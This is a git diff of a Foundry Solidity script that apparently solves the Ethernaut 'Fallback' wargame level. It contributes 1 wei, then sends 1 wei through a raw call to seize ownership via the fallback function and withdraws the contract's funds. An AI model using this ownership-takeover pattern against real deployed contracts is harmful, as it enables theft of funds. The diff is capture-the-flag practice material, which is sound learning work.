@@ -7,17 +7,18 @@ import "forge-std/console.sol";
 
 contract FallbackSolution is Script {
 
-    Fallback public fallbackInstance = Fallback(payable(0x95035632b756725eB24FB855C2660Cf02ac7355F));
+    Fallback public fallbackInstance = Fallback(payable(0x37e1d616A0562a38Fc9A3030D91b2f031b5B0792));
 
     function run() external {
         vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
 
         fallbackInstance.contribute{value: 1 wei}();
-        address(fallbackInstance).call{value: 1 wei}("");
-        console.log("New Owner: ", fallbackInstance.owner());
-        console.log("My Address: ", vm.envAddress("MY_ADDRESS"));
+
+        (bool success, ) = address(fallbackInstance).call{value: 1 wei}("");
+        require(success, "ETH send failed");
+
         fallbackInstance.withdraw();
-        
+
         vm.stopBroadcast();
     }
 }
